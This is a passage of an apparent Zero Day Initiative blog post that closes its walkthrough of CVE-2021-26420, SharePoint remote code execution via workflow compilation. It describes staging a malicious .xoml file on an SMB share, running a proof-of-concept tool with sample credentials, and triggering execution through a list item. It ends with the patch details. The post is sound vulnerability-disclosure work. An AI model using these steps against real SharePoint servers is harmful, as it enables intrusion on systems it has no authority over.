                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png" data-image-dimensions="936x308" data-image-focal-point="0.5,0.5" alt="Picture13.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture13.png" width="936" height="308" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463285116-360SJE5K7T1CN8P809X9/Picture13.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_133129"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Now we need to upload the <strong><em>Attck.xoml</em></strong> file, containing the .NET code we want to run, into an SMB folder that is accessible from the SharePoint server. </p><p class="" style="white-space:pre-wrap;">We should place the remote path to the <strong><em>Attck.xoml</em></strong> file into <strong><em>WF02.rules</em></strong>:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_133608"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_294">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_293">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_292">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_291">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_290">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:23.504274368286133%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_289">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png" data-image-dimensions="936x220" data-image-focal-point="0.5,0.5" alt="Picture14.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture14.png" width="936" height="220" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463334924-AWPAIC4WOPWLS9HWB3SC/Picture14.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_135008"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Save changes in both files (<strong>WF02config.txt</strong> and <strong>WF02.rules)</strong> and upload them together with the <strong>WF02.xoml </strong>file to the <strong><em>Documents</em></strong> folder of our SharePoint site:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_135495"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_310">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_309">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_308">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_307">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_306">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:44.4444465637207%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_305">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png" data-image-dimensions="936x416" data-image-focal-point="0.5,0.5" alt="Picture15.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture15.png" width="936" height="416" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463381586-C8Q34SOFGHDTWNH36MEJ/Picture15.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_136856"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We are almost ready for the final step. But first, let’s check the <strong>C:\windows\temp</strong> folder on our target SharePoint server:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_137334"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_326">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_325">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_324">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_323">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_322">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:26.709402084350586%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_321">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png" data-image-dimensions="936x250" data-image-focal-point="0.5,0.5" alt="Picture16.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture16.png" width="936" height="250" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463417210-KAZLEI96WYQY24UNP3BG/Picture16.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_138721"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">There is no <strong>PoC_SPRCE02.txt </strong>file yet. </p><p class="" style="white-space:pre-wrap;">For our attack, we will use the <strong>SP_soap_RCE_PoC.exe</strong> application. We need to provide the following information:</p><p style="margin-left:40px;white-space:pre-wrap;" class=""><strong><em>— BaseUrl</em></strong> of the target SharePoint Site (in this case <strong>http://sp2019/sites/testsiteofuser2/</strong>)&nbsp;&nbsp; <br>— <strong><em>UserName</em></strong> (in this case <strong>user2</strong>)&nbsp; <br>— <strong><em>Password <br>— Domain</em></strong><br>— <strong><em>Relative path to the workflow config file on our site </em></strong>- "<strong>Shared Documents/WF02config.txt</strong>"</p>
</div>






















</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1632752463728_139577"><div class="sqs-block-content"><p>&gt; SP_soap_RCE_PoC.exe <a href="http://sp2019/sites/testsiteofuser2/">http://sp2019/sites/testsiteofuser2/</a> user2 P@ssw0rd contoso <span data-preserve-html-node="true" style="background-color:yellow">"Shared Documents/WF02config.xml"</span></p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_217221"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_342">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_341">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_340">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_339">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_338">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:16.02564239501953%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_337">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png" data-image-dimensions="936x150" data-image-focal-point="0.5,0.5" alt="Picture17.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture17.png" width="936" height="150" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463742578-FGD1W9MX6YM6LUX50WPG/Picture17.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_218961"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We received a “<strong>Success</strong>” result. Now to trigger the RCE, we just need to add a new item to <strong><em>NewList</em></strong>:&nbsp; </p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_219443"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_358">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_357">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_356">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_355">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_354">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:39.9572639465332%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_353">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png" data-image-dimensions="936x374" data-image-focal-point="0.5,0.5" alt="Picture18.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture18.png" width="936" height="374" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463779089-D4UALZF5T7DWR9CTJPS1/Picture18.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_220834"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Click on the “<strong><em>Save</em></strong>” button there.</p><p class="" style="white-space:pre-wrap;">Let’s check <strong>C:\windows\temp</strong> folder on our target SharePoint server:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_221327"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_374">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_373">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_372">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_371">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_370">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:25.641027450561523%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_369">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png" data-image-dimensions="936x240" data-image-focal-point="0.5,0.5" alt="Picture19.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture19.png" width="936" height="240" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463846297-GHSETHESK0HTOZ69EDYE/Picture19.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_222751"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">The file PoC_SPRCE02.txt has been created, demonstrating the success of our code execution. In this manner, our attacker can execute arbitrary OS commands in the context of the SharePoint web application account.</p><p class="" style="white-space:pre-wrap;">To run additional OS commands, we would need to place them into <strong>Attck.xoml</strong> file in the shared folder and create another new item in <strong><em>NewList</em></strong>.</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_223230"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_389">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_388">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_387">
          
        
        

        
          
            
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_386">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:24.572649002075195%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_385">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png" data-image-dimensions="936x230" data-image-focal-point="0.5,0.5" alt="Picture20.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture20.png" width="936" height="230" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463882636-D4GFWPDUPNYQL0HXW1J9/Picture20.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_224572"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;"><strong>Conclusion</strong></p><p class="" style="white-space:pre-wrap;">Microsoft patched this in June and assigned identifier CVE-2021-26420, with a CVSS score of 7.1. While the inclusion of an attacker-controlled SMB server adds a level of complexity, this bug can still be used for code execution in many scenarios. Since SharePoint is generally considered an attractive target for attackers, it would not be surprising if this bug were to be found in the wild. SharePoint continues to be an attractive target for security researchers, and many SharePoint-related disclosures are currently in our <a href="https://www.zerodayinitiative.com/advisories/upcoming/">Upcoming</a> queue. Stay tuned to this blog for details about those bugs once they are disclosed.</p><p class="" style="white-space:pre-wrap;">Until then, follow the <a href="https://twitter.com/thezdi" target="_blank">team</a> for the latest in exploit techniques and security patches.</p>
</div>






















</div></div></div></div></div>
                            </div>

                            <!--TAGS-->
                            <ul class="blog-tags">
                            
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/Microsoft">Microsoft</a></li>
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/SharePoint">SharePoint</a></li>
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/Research">Research</a></li>
                                
                            
                            </ul>
                        </div>
                        
                    </div><!-- /. contentBlock -->
                </div>

        </div>
    </div>

<div id="footer" style="padding: 0px">
    <div id="footerContact">
        <div class="content">
            <div class="footerContactBox">
                <h3>General Inquiries</h3>
                <a href="mailto:zdi@trendmicro.com">zdi@trendmicro.com</a>
            </div>
            <div class="footerContactBox">
                <h3>Find us on X</h3>
                <a href="https://twitter.com/thezdi">@thezdi</a>
            </div>
            <div class="footerContactBox">
                <h3>Find us on Mastodon</h3>
